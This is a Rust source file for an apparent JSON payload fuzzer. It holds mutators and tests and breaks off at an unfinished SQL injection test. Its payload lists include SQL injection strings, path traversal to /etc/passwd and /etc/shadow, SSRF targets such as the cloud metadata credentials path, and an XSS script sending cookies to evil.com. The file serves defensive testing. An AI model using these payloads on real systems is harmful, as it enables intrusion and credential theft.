//! Built-in mutators for payload fuzzing.
//!
//! Each mutator implements the `Mutator` trait and produces a specific
//! class of mutation on a valid JSON payload.

use crate::Mutator;
use serde_json::{Map, Value};

// ---------------------------------------------------------------------------
// BoundaryMutator
// ---------------------------------------------------------------------------

/// Produces boundary-value mutations: empty strings, very long strings,
/// zero/negative/NaN numbers, extreme dates, null values.
pub struct BoundaryMutator;

impl Mutator for BoundaryMutator {
    fn name(&self) -> &'static str {
        "boundary"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &BoundaryStrategy)
    }
}

struct BoundaryStrategy;

impl MutationStrategy for BoundaryStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        match value {
            Value::String(s) => {
                let choices: [&[u8]; 4] = [b"", b"\0", &vec![b'A'; 65536], s.as_bytes()];
                let idx = rng.next() as usize % choices.len();
                Value::String(String::from_utf8_lossy(choices[idx]).to_string())
            }
            Value::Number(n) => {
                let choices: [f64; 5] = [
                    0.0,
                    -1.0,
                    f64::NAN,
                    f64::INFINITY,
                    n.as_f64().unwrap_or(0.0),
                ];
                let idx = rng.next() as usize % choices.len();
                serde_json::json!(choices[idx])
            }
            Value::Bool(_) => Value::Null,
            Value::Null => Value::Null,
            Value::Array(_) | Value::Object(_) => value.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// EncodingMutator
// ---------------------------------------------------------------------------

/// Produces encoding-related mutations: JSON injection, deeply nested objects,
/// duplicate keys, unicode normalization attacks, null bytes.
pub struct EncodingMutator;

impl Mutator for EncodingMutator {
    fn name(&self) -> &'static str {
        "encoding"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &EncodingStrategy)
    }
}

struct EncodingStrategy;

impl MutationStrategy for EncodingStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        match value {
            Value::String(s) => {
                let choices: [&str; 5] = [
                    "{{constructor}}",
                    "\u{202E}",
                    "\u{0000}",
                    &s.replace('<', "\\u003c"),
                    s,
                ];
                let idx = rng.next() as usize % choices.len();
                Value::String(choices[idx].to_string())
            }
            _ => value.clone(),
        }
    }

    fn post_process_object(&self, obj: &mut Map<String, Value>, rng: &mut SimpleRng) {
        // Add a deeply nested key
        if rng.next().is_multiple_of(3) {
            let mut target = obj;
            for _ in 0..10 {
                let key = format!("_deep_{}", rng.next());
                target.insert(key.clone(), Value::Object(Map::new()));
                target = target
                    .get_mut(&key)
                    .and_then(|v| v.as_object_mut())
                    .unwrap();
            }
            target.insert("value".into(), Value::String("deeply nested".into()));
        }
    }
}

// ---------------------------------------------------------------------------
// TypeMismatchMutator
// ---------------------------------------------------------------------------

/// Swaps types: string where number expected, array where object expected,
/// boolean where string expected, etc.
pub struct TypeMismatchMutator;

impl Mutator for TypeMismatchMutator {
    fn name(&self) -> &'static str {
        "type_mismatch"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &TypeMismatchStrategy)
    }
}

struct TypeMismatchStrategy;

impl MutationStrategy for TypeMismatchStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        let choices: [Value; 5] = [
            Value::Null,
            Value::Bool(true),
            Value::Number(serde_json::Number::from(0)),
            Value::String("".into()),
            value.clone(),
        ];
        let idx = rng.next() as usize % choices.len();
        choices[idx].clone()
    }

    fn mutate_array(&self, _value: &Value, rng: &mut SimpleRng) -> Value {
        let choices: [Value; 3] = [
            Value::Null,
            Value::Object(Map::new()),
            Value::String("[]".into()),
        ];
        let idx = rng.next() as usize % choices.len();
        choices[idx].clone()
    }

    fn mutate_object(&self, _value: &Value, rng: &mut SimpleRng) -> Value {
        let choices: [Value; 3] = [
            Value::Null,
            Value::Array(vec![]),
            Value::String("{}".into()),
        ];
        let idx = rng.next() as usize % choices.len();
        choices[idx].clone()
    }
}

// ---------------------------------------------------------------------------
// CardinalityMutator
// ---------------------------------------------------------------------------

/// Modifies cardinality: removes required fields, duplicates array elements,
/// adds unexpected fields, empties arrays.
pub struct CardinalityMutator;

impl Mutator for CardinalityMutator {
    fn name(&self) -> &'static str {
        "cardinality"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &CardinalityStrategy)
    }
}

struct CardinalityStrategy;

impl MutationStrategy for CardinalityStrategy {
    fn post_process_object(&self, obj: &mut Map<String, Value>, rng: &mut SimpleRng) {
        // Remove a random field
        if !obj.is_empty() && rng.next().is_multiple_of(2) {
            let keys: Vec<String> = obj.keys().cloned().collect();
            let idx = rng.next() as usize % keys.len();
            obj.remove(&keys[idx]);
        }
        // Add an unexpected field
        if rng.next().is_multiple_of(3) {
            obj.insert(
                format!("_unexpected_{}", rng.next()),
                Value::String("unexpected".into()),
            );
        }
    }

    fn post_process_array(&self, arr: &mut Vec<Value>, rng: &mut SimpleRng) {
        if arr.is_empty() {
            return;
        }
        // Duplicate a random element
        if rng.next().is_multiple_of(2) {
            let idx = rng.next() as usize % arr.len();
            arr.push(arr[idx].clone());
        }
        // Or clear the array
        if rng.next().is_multiple_of(5) {
            arr.clear();
        }
    }
}

// ---------------------------------------------------------------------------
// UnicodeNormalizationMutator
// ---------------------------------------------------------------------------

/// Replaces ASCII characters with Unicode homoglyphs, adds zero-width
/// characters, and injects Bidi override sequences.
pub struct UnicodeNormalizationMutator;

impl Mutator for UnicodeNormalizationMutator {
    fn name(&self) -> &'static str {
        "unicode_normalization"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &UnicodeNormalizationStrategy)
    }
}

struct UnicodeNormalizationStrategy;

impl UnicodeNormalizationStrategy {
    /// Map of ASCII characters to Cyrillic homoglyphs.
    fn homoglyph_map() -> &'static [(char, char)] {
        &[
            ('a', '\u{0430}'), // Cyrillic small letter a
            ('e', '\u{0435}'), // Cyrillic small letter ie
            ('o', '\u{043E}'), // Cyrillic small letter o
            ('c', '\u{0441}'), // Cyrillic small letter es
            ('p', '\u{0440}'), // Cyrillic small letter er
            ('x', '\u{0445}'), // Cyrillic small letter ha
            ('y', '\u{0443}'), // Cyrillic small letter u
            ('A', '\u{0410}'), // Cyrillic capital letter a
            ('E', '\u{0415}'), // Cyrillic capital letter ie
            ('O', '\u{041E}'), // Cyrillic capital letter o
            ('C', '\u{0421}'), // Cyrillic capital letter es
            ('P', '\u{0420}'), // Cyrillic capital letter er
            ('X', '\u{0425}'), // Cyrillic capital letter ha
            ('B', '\u{0412}'), // Cyrillic capital letter ve
            ('H', '\u{041D}'), // Cyrillic capital letter en
            ('M', '\u{041C}'), // Cyrillic capital letter em
        ]
    }

    fn apply_homoglyphs(s: &str) -> String {
        let map = Self::homoglyph_map();
        s.chars()
            .map(|c| {
                map.iter()
                    .find(|&&(ascii, _)| ascii == c)
                    .map(|&(_, homo)| homo)
                    .unwrap_or(c)
            })
            .collect()
    }

    fn zero_width_payloads() -> &'static [&'static str] {
        &[
            "\u{200C}",         // ZWNJ
            "\u{200D}",         // ZWJ
            "\u{200B}",         // ZWSP
            "\u{202E}",         // RTL override
            "\u{202A}\u{202C}", // LTR override + pop directional formatting
        ]
    }

    fn bidi_payloads() -> &'static [&'static str] {
        &[
            "\u{202E}admin",         // RTL override
            "\u{202E}true\u{202C}",  // RTL override with pop
            "\u{2066}admin\u{2069}", // LTR isolate
            "\u{2067}admin\u{2069}", // RTL isolate
        ]
    }
}

impl MutationStrategy for UnicodeNormalizationStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        match value {
            Value::String(s) => match rng.next() % 4 {
                0 => Value::String(Self::apply_homoglyphs(s)),
                1 => {
                    let zw = Self::zero_width_payloads()
                        [rng.next() as usize % Self::zero_width_payloads().len()];
                    Value::String(format!("{s}{zw}"))
                }
                2 => Value::String(
                    Self::bidi_payloads()[rng.next() as usize % Self::bidi_payloads().len()]
                        .to_string(),
                ),
                _ => Value::String(s.to_string()),
            },
            _ => value.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// FormatStringInjectionMutator
// ---------------------------------------------------------------------------

/// Injects printf-style format specifiers, `{0}` style placeholders, and
/// `$1` regex-style backreferences into string values.
pub struct FormatStringInjectionMutator;

impl Mutator for FormatStringInjectionMutator {
    fn name(&self) -> &'static str {
        "format_string_injection"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &FormatStringInjectionStrategy)
    }
}

struct FormatStringInjectionStrategy;

impl FormatStringInjectionStrategy {
    fn format_payloads() -> &'static [&'static str] {
        &[
            "%s",
            "%d",
            "%x",
            "%n",
            "%08x",
            "%s%s%s%s%s",
            "%d%d%d%d%d",
            "%08x%08x%08x",
        ]
    }

    fn placeholder_payloads() -> &'static [&'static str] {
        &[
            "{0}",
            "{user}",
            "{password}",
            "{0}{1}{2}",
            "{{constructor}}",
        ]
    }

    fn backreference_payloads() -> &'static [&'static str] {
        &["$1", "$2", "${1}", "${2}", "$&", "$`", "$'"]
    }
}

impl MutationStrategy for FormatStringInjectionStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        match value {
            Value::String(s) => match rng.next() % 4 {
                0 => {
                    let fmt = Self::format_payloads()
                        [rng.next() as usize % Self::format_payloads().len()];
                    Value::String(format!("{s}{fmt}"))
                }
                1 => {
                    let ph = Self::placeholder_payloads()
                        [rng.next() as usize % Self::placeholder_payloads().len()];
                    Value::String(format!("{s}{ph}"))
                }
                2 => {
                    let br = Self::backreference_payloads()
                        [rng.next() as usize % Self::backreference_payloads().len()];
                    Value::String(format!("{s}{br}"))
                }
                _ => Value::String(s.to_string()),
            },
            _ => value.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// PathTraversalMutator
// ---------------------------------------------------------------------------

/// Replaces string values with path traversal sequences, absolute paths,
/// and encoded variants.
pub struct PathTraversalMutator;

impl Mutator for PathTraversalMutator {
    fn name(&self) -> &'static str {
        "path_traversal"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &PathTraversalStrategy)
    }
}

struct PathTraversalStrategy;

impl PathTraversalStrategy {
    fn traversal_payloads() -> &'static [&'static str] {
        &[
            "../",
            "../../",
            "../../../etc/passwd",
            "..\\",
            "..\\..\\",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f",
        ]
    }

    fn absolute_path_payloads() -> &'static [&'static str] {
        &[
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "C:\\Windows\\system32\\config\\sam",
            "C:\\Windows\\win.ini",
            "file:///etc/passwd",
        ]
    }

    fn encoded_variant_payloads() -> &'static [&'static str] {
        &[
            "..%252f..%252f",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%ae%c0%ae/",
            "..%c0%ae%c0%ae%c0%ae%c0%ae/",
            "%c0%ae%c0%ae/",
            "..%252f",
        ]
    }
}

impl MutationStrategy for PathTraversalStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        match value {
            Value::String(_s) => match rng.next() % 4 {
                0 => Value::String(
                    Self::traversal_payloads()
                        [rng.next() as usize % Self::traversal_payloads().len()]
                    .to_string(),
                ),
                1 => Value::String(
                    Self::absolute_path_payloads()
                        [rng.next() as usize % Self::absolute_path_payloads().len()]
                    .to_string(),
                ),
                2 => Value::String(
                    Self::encoded_variant_payloads()
                        [rng.next() as usize % Self::encoded_variant_payloads().len()]
                    .to_string(),
                ),
                _ => Value::String(String::new()),
            },
            _ => value.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// SSRFAttemptMutator
// ---------------------------------------------------------------------------

/// Replaces URL/hostname fields with internal addresses, cloud metadata
/// endpoints, and DNS rebinding patterns.
pub struct SSRFAttemptMutator;

impl Mutator for SSRFAttemptMutator {
    fn name(&self) -> &'static str {
        "ssrf_attempt"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &SSRFAttemptStrategy)
    }
}

struct SSRFAttemptStrategy;

impl SSRFAttemptStrategy {
    fn internal_addresses() -> &'static [&'static str] {
        &[
            "127.0.0.1",
            "127.0.0.1:80",
            "0.0.0.0",
            "[::1]",
            "[::1]:80",
            "localhost",
            "10.0.0.1",
            "172.16.0.1",
            "192.168.1.1",
        ]
    }

    fn cloud_metadata_payloads() -> &'static [&'static str] {
        &[
            "169.254.169.254",
            "169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/iam/security-credentials/",
            "169.254.169.254/latest/user-data",
            "metadata.google.internal",
            "100.100.100.200/latest/meta-data/",
        ]
    }

    fn dns_rebinding_payloads() -> &'static [&'static str] {
        &[
            "1e100.net",
            "spoofed.burpcollaborator.net",
            "0x7f000001",
            "2130706433",
            "0177.0.0.1",
        ]
    }
}

impl MutationStrategy for SSRFAttemptStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        match value {
            Value::String(_s) => match rng.next() % 4 {
                0 => Value::String(
                    Self::internal_addresses()
                        [rng.next() as usize % Self::internal_addresses().len()]
                    .to_string(),
                ),
                1 => Value::String(
                    Self::cloud_metadata_payloads()
                        [rng.next() as usize % Self::cloud_metadata_payloads().len()]
                    .to_string(),
                ),
                2 => Value::String(
                    Self::dns_rebinding_payloads()
                        [rng.next() as usize % Self::dns_rebinding_payloads().len()]
                    .to_string(),
                ),
                _ => Value::String(String::new()),
            },
            _ => value.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// SQLInjectionMutator
// ---------------------------------------------------------------------------

/// Injects SQL fragments, time-based blind patterns, and comment injection
/// into string values.
pub struct SQLInjectionMutator;

impl Mutator for SQLInjectionMutator {
    fn name(&self) -> &'static str {
        "sql_injection"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &SQLInjectionStrategy)
    }
}

struct SQLInjectionStrategy;

impl SQLInjectionStrategy {
    fn sql_fragments() -> &'static [&'static str] {
        &[
            "' OR '1'='1",
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users--",
            "' UNION SELECT 1,2,3--",
            "admin' --",
            "1' OR '1'='1",
        ]
    }

    fn time_based_payloads() -> &'static [&'static str] {
        &[
            "' OR SLEEP(5)--",
            "' OR SLEEP(5) AND '1'='1",
            "1' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
        ]
    }

    fn comment_payloads() -> &'static [&'static str] {
        &["'--", "'/*", "'*/ OR '1'='1", "1'--", "admin'/*"]
    }
}

impl MutationStrategy for SQLInjectionStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        match value {
            Value::String(_s) => match rng.next() % 4 {
                0 => Value::String(
                    Self::sql_fragments()[rng.next() as usize % Self::sql_fragments().len()]
                        .to_string(),
                ),
                1 => Value::String(
                    Self::time_based_payloads()
                        [rng.next() as usize % Self::time_based_payloads().len()]
                    .to_string(),
                ),
                2 => Value::String(
                    Self::comment_payloads()[rng.next() as usize % Self::comment_payloads().len()]
                        .to_string(),
                ),
                _ => Value::String(String::new()),
            },
            _ => value.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// XSSInjectionMutator
// ---------------------------------------------------------------------------

/// Injects script tags, event handlers, `javascript:` URLs, and encoded
/// XSS variants into string values.
pub struct XSSInjectionMutator;

impl Mutator for XSSInjectionMutator {
    fn name(&self) -> &'static str {
        "xss_injection"
    }

    fn mutate(&self, base: &Value, seed: u64) -> Value {
        let mut rng = SimpleRng::new(seed);
        mutate_value(base, &mut rng, &XSSInjectionStrategy)
    }
}

struct XSSInjectionStrategy;

impl XSSInjectionStrategy {
    fn script_tag_payloads() -> &'static [&'static str] {
        &[
            "<script>alert(1)</script>",
            "<script>alert('xss')</script>",
            "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
            "</script><script>alert(1)</script>",
            "<script>alert(1)",
        ]
    }

    fn event_handler_payloads() -> &'static [&'static str] {
        &[
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<img src=x onerror=alert('xss')>",
        ]
    }

    fn javascript_url_payloads() -> &'static [&'static str] {
        &[
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "JavaScript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "javascript:fetch('https://evil.com')",
        ]
    }

    fn encoded_payloads() -> &'static [&'static str] {
        &[
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "jav&#x61;script:alert(1)",
            "&#106;avascript:alert(1)",
        ]
    }
}

impl MutationStrategy for XSSInjectionStrategy {
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        match value {
            Value::String(_s) => match rng.next() % 5 {
                0 => Value::String(
                    Self::script_tag_payloads()
                        [rng.next() as usize % Self::script_tag_payloads().len()]
                    .to_string(),
                ),
                1 => Value::String(
                    Self::event_handler_payloads()
                        [rng.next() as usize % Self::event_handler_payloads().len()]
                    .to_string(),
                ),
                2 => Value::String(
                    Self::javascript_url_payloads()
                        [rng.next() as usize % Self::javascript_url_payloads().len()]
                    .to_string(),
                ),
                3 => Value::String(
                    Self::encoded_payloads()[rng.next() as usize % Self::encoded_payloads().len()]
                        .to_string(),
                ),
                _ => Value::String(String::new()),
            },
            _ => value.clone(),
        }
    }
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

/// A simple deterministic PRNG for reproducible mutations.
struct SimpleRng(u64);

impl SimpleRng {
    fn new(seed: u64) -> Self {
        Self(seed)
    }

    fn next(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        self.0 >> 33
    }
}

trait MutationStrategy {
    /// Mutate a scalar value (string, number, bool, null).
    fn mutate_scalar(&self, value: &Value, rng: &mut SimpleRng) -> Value {
        let _ = (value, rng);
        Value::Null
    }

    /// Mutate an array value (default: replace with null).
    fn mutate_array(&self, _value: &Value, rng: &mut SimpleRng) -> Value {
        let _ = rng;
        Value::Null
    }

    /// Mutate an object value (default: replace with null).
    fn mutate_object(&self, _value: &Value, rng: &mut SimpleRng) -> Value {
        let _ = rng;
        Value::Null
    }

    /// Post-process an object after recursive mutation.
    fn post_process_object(&self, _obj: &mut Map<String, Value>, _rng: &mut SimpleRng) {}

    /// Post-process an array after recursive mutation.
    fn post_process_array(&self, _arr: &mut Vec<Value>, _rng: &mut SimpleRng) {}
}

fn mutate_value(value: &Value, rng: &mut SimpleRng, strategy: &dyn MutationStrategy) -> Value {
    match value {
        Value::Null | Value::Bool(_) | Value::String(_) | Value::Number(_) => {
            strategy.mutate_scalar(value, rng)
        }
        Value::Array(arr) => {
            if rng.next().is_multiple_of(4) {
                return strategy.mutate_array(value, rng);
            }
            let mut new_arr: Vec<Value> =
                arr.iter().map(|v| mutate_value(v, rng, strategy)).collect();
            strategy.post_process_array(&mut new_arr, rng);
            Value::Array(new_arr)
        }
        Value::Object(obj) => {
            if rng.next().is_multiple_of(4) {
                return strategy.mutate_object(value, rng);
            }
            let mut new_obj: Map<String, Value> = obj
                .iter()
                .map(|(k, v)| (k.clone(), mutate_value(v, rng, strategy)))
                .collect();
            strategy.post_process_object(&mut new_obj, rng);
            Value::Object(new_obj)
        }
    }
}

/// Return all built-in mutators.
pub fn all_mutators() -> Vec<Box<dyn Mutator>> {
    vec![
        Box::new(BoundaryMutator),
        Box::new(EncodingMutator),
        Box::new(TypeMismatchMutator),
        Box::new(CardinalityMutator),
        Box::new(UnicodeNormalizationMutator),
        Box::new(FormatStringInjectionMutator),
        Box::new(PathTraversalMutator),
        Box::new(SSRFAttemptMutator),
        Box::new(SQLInjectionMutator),
        Box::new(XSSInjectionMutator),
    ]
}

/// Look up a mutator by name.
pub fn mutator_by_name(name: &str) -> Option<Box<dyn Mutator>> {
    match name {
        "boundary" => Some(Box::new(BoundaryMutator)),
        "encoding" => Some(Box::new(EncodingMutator)),
        "type_mismatch" => Some(Box::new(TypeMismatchMutator)),
        "cardinality" => Some(Box::new(CardinalityMutator)),
        "unicode_normalization" => Some(Box::new(UnicodeNormalizationMutator)),
        "format_string_injection" => Some(Box::new(FormatStringInjectionMutator)),
        "path_traversal" => Some(Box::new(PathTraversalMutator)),
        "ssrf_attempt" => Some(Box::new(SSRFAttemptMutator)),
        "sql_injection" => Some(Box::new(SQLInjectionMutator)),
        "xss_injection" => Some(Box::new(XSSInjectionMutator)),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // -----------------------------------------------------------------------
    // Existing tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_boundary_mutator_name() {
        assert_eq!(BoundaryMutator.name(), "boundary");
    }

    #[test]
    fn test_boundary_mutator_changes_value() {
        let base = json!({"name": "hello", "count": 42});
        let mutated = BoundaryMutator.mutate(&base, 1);
        // At least one field should differ
        assert_ne!(base, mutated);
    }

    #[test]
    fn test_boundary_mutator_deterministic() {
        let base = json!({"name": "hello"});
        let a = BoundaryMutator.mutate(&base, 42);
        let b = BoundaryMutator.mutate(&base, 42);
        assert_eq!(a, b);
    }

    #[test]
    fn test_encoding_mutator_name() {
        assert_eq!(EncodingMutator.name(), "encoding");
    }

    #[test]
    fn test_type_mismatch_mutator_name() {
        assert_eq!(TypeMismatchMutator.name(), "type_mismatch");
    }

    #[test]
    fn test_cardinality_mutator_name() {
        assert_eq!(CardinalityMutator.name(), "cardinality");
    }

    #[test]
    fn test_all_mutators_returns_ten() {
        let mutators = all_mutators();
        assert_eq!(mutators.len(), 10);
    }

    #[test]
    fn test_mutator_by_name() {
        assert!(mutator_by_name("boundary").is_some());
        assert!(mutator_by_name("encoding").is_some());
        assert!(mutator_by_name("type_mismatch").is_some());
        assert!(mutator_by_name("cardinality").is_some());
        assert!(mutator_by_name("nonexistent").is_none());
    }

    #[test]
    fn test_cardinality_removes_field() {
        let base = json!({"a": 1, "b": 2, "c": 3});
        let mutated = CardinalityMutator.mutate(&base, 0);
        // With seed 0, the first field should be removed
        assert!(mutated.as_object().is_some_and(|o| o.len() < 3));
    }

    #[test]
    fn test_simple_rng_deterministic() {
        let mut a = SimpleRng::new(42);
        let mut b = SimpleRng::new(42);
        assert_eq!(a.next(), b.next());
        assert_eq!(a.next(), b.next());
    }

    // -----------------------------------------------------------------------
    // UnicodeNormalizationMutator tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_unicode_normalization_mutator_name() {
        assert_eq!(UnicodeNormalizationMutator.name(), "unicode_normalization");
    }

    #[test]
    fn test_unicode_normalization_changes_value() {
        let base = json!({"name": "hello"});
        let mutated = UnicodeNormalizationMutator.mutate(&base, 1);
        assert_ne!(base, mutated);
    }

    #[test]
    fn test_unicode_normalization_deterministic() {
        let base = json!({"name": "test"});
        let a = UnicodeNormalizationMutator.mutate(&base, 42);
        let b = UnicodeNormalizationMutator.mutate(&base, 42);
        assert_eq!(a, b);
    }

    #[test]
    fn test_unicode_normalization_homoglyphs() {
        // seed=2 -> choice 0 (homoglyphs)
        let base = json!("a");
        let mutated = UnicodeNormalizationMutator.mutate(&base, 2);
        let s = mutated.as_str().unwrap();
        // 'a' should become Cyrillic 'а'
        assert_eq!(s, "\u{0430}");
    }

    #[test]
    fn test_unicode_normalization_zero_width() {
        // seed=10 -> choice 1 (zero-width)
        let base = json!("x");
        let mutated = UnicodeNormalizationMutator.mutate(&base, 10);
        let s = mutated.as_str().unwrap();
        // zero-width chars appended
        assert!(s.len() > 1);
    }

    #[test]
    fn test_unicode_normalization_bidi() {
        // seed=1 -> choice 2 (bidi)
        let base = json!("x");
        let mutated = UnicodeNormalizationMutator.mutate(&base, 1);
        let s = mutated.as_str().unwrap();
        // bidi payloads
        assert!(s.contains('\u{202E}') || s.contains('\u{2066}') || s.contains('\u{2067}'));
    }

    #[test]
    fn test_unicode_normalization_preserves_non_string() {
        let base = json!({"count": 42});
        let mutated = UnicodeNormalizationMutator.mutate(&base, 0);
        assert_eq!(mutated["count"], json!(42));
    }

    // -----------------------------------------------------------------------
    // FormatStringInjectionMutator tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_format_string_injection_mutator_name() {
        assert_eq!(
            FormatStringInjectionMutator.name(),
            "format_string_injection"
        );
    }

    #[test]
    fn test_format_string_injection_changes_value() {
        let base = json!({"name": "hello"});
        let mutated = FormatStringInjectionMutator.mutate(&base, 1);
        assert_ne!(base, mutated);
    }

    #[test]
    fn test_format_string_injection_deterministic() {
        let base = json!({"name": "test"});
        let a = FormatStringInjectionMutator.mutate(&base, 42);
        let b = FormatStringInjectionMutator.mutate(&base, 42);
        assert_eq!(a, b);
    }

    #[test]
    fn test_format_string_injection_printf() {
        // seed=2 -> choice 0 (printf)
        let base = json!("hello");
        let mutated = FormatStringInjectionMutator.mutate(&base, 2);
        let s = mutated.as_str().unwrap();
        assert!(s.contains('%'));
    }

    #[test]
    fn test_format_string_injection_placeholder() {
        // seed=10 -> choice 1 (placeholder)
        let base = json!("hello");
        let mutated = FormatStringInjectionMutator.mutate(&base, 10);
        let s = mutated.as_str().unwrap();
        assert!(s.contains('{') || s.contains('}'));
    }

    #[test]
    fn test_format_string_injection_backreference() {
        // seed=1 -> choice 2 (backreference)
        let base = json!("hello");
        let mutated = FormatStringInjectionMutator.mutate(&base, 1);
        let s = mutated.as_str().unwrap();
        assert!(s.contains('$'));
    }

    #[test]
    fn test_format_string_injection_preserves_non_string() {
        let base = json!({"count": 42});
        let mutated = FormatStringInjectionMutator.mutate(&base, 0);
        assert_eq!(mutated["count"], json!(42));
    }

    // -----------------------------------------------------------------------
    // PathTraversalMutator tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_path_traversal_mutator_name() {
        assert_eq!(PathTraversalMutator.name(), "path_traversal");
    }

    #[test]
    fn test_path_traversal_changes_value() {
        let base = json!({"path": "safe.txt"});
        let mutated = PathTraversalMutator.mutate(&base, 1);
        assert_ne!(base, mutated);
    }

    #[test]
    fn test_path_traversal_deterministic() {
        let base = json!({"path": "file.txt"});
        let a = PathTraversalMutator.mutate(&base, 42);
        let b = PathTraversalMutator.mutate(&base, 42);
        assert_eq!(a, b);
    }

    #[test]
    fn test_path_traversal_dotdot() {
        // seed=2 -> choice 0 (traversal)
        let base = json!("safe.txt");
        let mutated = PathTraversalMutator.mutate(&base, 2);
        let s = mutated.as_str().unwrap();
        assert!(s.contains("../") || s.contains("..\\") || s.contains("%2e"));
    }

    #[test]
    fn test_path_traversal_absolute() {
        // seed=10 -> choice 1 (absolute)
        let base = json!("safe.txt");
        let mutated = PathTraversalMutator.mutate(&base, 10);
        let s = mutated.as_str().unwrap();
        assert!(s.contains('/') || s.contains('\\'));
    }

    #[test]
    fn test_path_traversal_encoded() {
        // seed=1 -> choice 2 (encoded)
        let base = json!("safe.txt");
        let mutated = PathTraversalMutator.mutate(&base, 1);
        let s = mutated.as_str().unwrap();
        assert!(s.contains('%'));
    }

    #[test]
    fn test_path_traversal_preserves_non_string() {
        let base = json!({"count": 42});
        let mutated = PathTraversalMutator.mutate(&base, 0);
        assert_eq!(mutated["count"], json!(42));
    }

    // -----------------------------------------------------------------------
    // SSRFAttemptMutator tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_ssrf_attempt_mutator_name() {
        assert_eq!(SSRFAttemptMutator.name(), "ssrf_attempt");
    }

    #[test]
    fn test_ssrf_attempt_changes_value() {
        let base = json!({"url": "https://example.com"});
        let mutated = SSRFAttemptMutator.mutate(&base, 1);
        assert_ne!(base, mutated);
    }

    #[test]
    fn test_ssrf_attempt_deterministic() {
        let base = json!({"url": "https://example.com"});
        let a = SSRFAttemptMutator.mutate(&base, 42);
        let b = SSRFAttemptMutator.mutate(&base, 42);
        assert_eq!(a, b);
    }

    #[test]
    fn test_ssrf_attempt_internal_address() {
        // seed=2 -> choice 0 (internal)
        let base = json!("https://example.com");
        let mutated = SSRFAttemptMutator.mutate(&base, 2);
        let s = mutated.as_str().unwrap();
        assert!(
            s.contains("127.0.0.1")
                || s.contains("0.0.0.0")
                || s.contains("localhost")
                || s.contains("10.")
                || s.contains("172.")
                || s.contains("192.168")
                || s.contains("[::1]")
        );
    }

    #[test]
    fn test_ssrf_attempt_cloud_metadata() {
        // seed=10 -> choice 1 (cloud metadata)
        let base = json!("https://example.com");
        let mutated = SSRFAttemptMutator.mutate(&base, 10);
        let s = mutated.as_str().unwrap();
        assert!(s.contains("169.254") || s.contains("metadata"));
    }

    #[test]
    fn test_ssrf_attempt_dns_rebinding() {
        // seed=1 -> choice 2 (DNS rebinding)
        let base = json!("https://example.com");
        let mutated = SSRFAttemptMutator.mutate(&base, 1);
        let s = mutated.as_str().unwrap();
        assert!(!s.is_empty());
    }

    #[test]
    fn test_ssrf_attempt_preserves_non_string() {
        let base = json!({"count": 42});
        let mutated = SSRFAttemptMutator.mutate(&base, 0);
        assert_eq!(mutated["count"], json!(42));
    }

    // -----------------------------------------------------------------------
    // SQLInjectionMutator tests
    // -----------------------------------------------------------------------

    #[test]
